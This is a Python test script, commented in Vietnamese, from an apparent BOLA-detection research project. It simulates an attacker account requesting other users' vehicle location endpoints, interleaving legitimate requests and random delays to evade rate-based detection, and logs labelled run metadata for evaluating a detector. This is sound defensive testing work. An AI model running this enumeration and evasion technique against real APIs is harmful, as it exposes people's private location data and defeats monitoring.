# services/bola-detector/attacks/bola_vehicle_scan_variant_mixed_traffic.py
"""Biến thể TEST-ONLY (Bước 2.2) — trộn lẫn request tấn công với truy cập hợp
lệ (attacker xem lại chính xe của mình xen giữa các lần quét nạn nhân), né
phát hiện dựa trên tần suất/tỷ lệ request bất thường thuần tuý (ví dụ chỉ
nhìn req_rate_per_min hoặc pct 'toàn bộ request đều nhắm object lạ'). KHÔNG
đưa vào tập train — chỉ dùng để test tính vững của model ở Bước 4.
"""
import json
import random
import time
import uuid

import requests

from bola_vehicle_scan import BASE, login


def run_attack(
    attacker_token: str,
    attacker_own_vehicle_id: str,
    victim_vehicle_ids: list[str],
    out_meta_path: str,
):
    attack_run_id = str(uuid.uuid4())
    headers = {
        "Authorization": f"Bearer {attacker_token}",
        "X-Attack-Run-Id": attack_run_id,
    }
    start = time.time()
    leaked = []
    for vid in victim_vehicle_ids:
        # request hợp lệ xen giữa — nhìn ngoài giống hành vi user bình thường
        requests.get(f"{BASE}/identity/api/v2/vehicle/{attacker_own_vehicle_id}/location", headers=headers)
        time.sleep(random.uniform(0.5, 2.0))

        resp = requests.get(f"{BASE}/identity/api/v2/vehicle/{vid}/location", headers=headers)
        leaked.append({"vehicle_id": vid, "status": resp.status_code})
        time.sleep(random.uniform(0.5, 2.0))
    end = time.time()

    with open(out_meta_path, "a") as f:
        f.write(
            json.dumps(
                {
                    "attack_run_id": attack_run_id,
                    "attack_class": "BOLA",
                    "start_ts": start,
                    "end_ts": end,
                    "is_test_only_variant": True,
                    "variant": "mixed_with_valid_traffic",
                }
            )
            + "\n"
        )
    return attack_run_id, leaked


if __name__ == "__main__":
    import sys

    attacker_token = login("attacker@test.local", "Attacker123@")
    own_vehicle_id = requests.get(
        f"{BASE}/identity/api/v2/vehicle/vehicles",
        headers={"Authorization": f"Bearer {attacker_token}"},
    ).json()
    if not own_vehicle_id:
        print("Attacker chưa có xe riêng — cần add_vehicle trước khi chạy biến thể này.")
        sys.exit(1)
    own_vehicle_id = own_vehicle_id[0]["uuid"]

    victim_vehicle_ids = [line.strip() for line in sys.stdin if line.strip()]
    attack_run_id, leaked = run_attack(
        attacker_token, own_vehicle_id, victim_vehicle_ids, "attacks/attack_runs_meta.jsonl"
    )
    print(f"[variant/mixed_traffic] attack_run_id={attack_run_id}")
    for item in leaked:
        print(item)
